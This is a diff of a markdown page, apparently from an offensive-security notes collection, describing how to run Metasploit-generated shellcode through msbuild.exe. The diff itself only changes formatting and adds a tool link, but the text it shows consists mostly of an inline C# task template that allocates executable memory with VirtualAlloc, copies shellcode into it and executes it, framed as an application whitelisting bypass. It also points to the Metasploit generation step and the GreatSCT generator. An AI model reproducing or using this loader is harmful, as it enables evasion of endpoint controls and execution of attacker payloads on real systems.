@@ -1,10 +1,10 @@
-## Execute C\#
+## Execute C\
 
 ### msbuild.exe
 
 Use the following shell temlate and insert the csharp code and save as an xml
 
-Replace “INSERT\_SHELLCODE\_HERE” in the template with the shellcode generated from Metasploit. 
+Replace “INSERT\_SHELLCODE\_HERE” in the template with the shellcode generated from Metasploit.
 
 Note1: This includes "byte\[\] shellcode = new byte\[\]"
 
@@ -25,7 +25,7 @@ Note2: Use metasploit to generate C\# shellcode with the follow command: “msfv
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
- 
+
  <Code Type="Class" Language="cs">
  <![CDATA[
  using System;
@@ -56,7 +56,7 @@ Note2: Use metasploit to generate C\# shellcode with the follow command: “msfv
  public override bool Execute()
  {
  byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE } };
- 
+
  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
@@ -77,11 +77,9 @@ Note2: Use metasploit to generate C\# shellcode with the follow command: “msfv
 
 
 
-
+[GreatSCT](https://github.com/ConsciousHacker/GreatSCT)--tool to automatically generate the xml file.
 
 References:
 
-https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/
-
-
+[https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/)
 
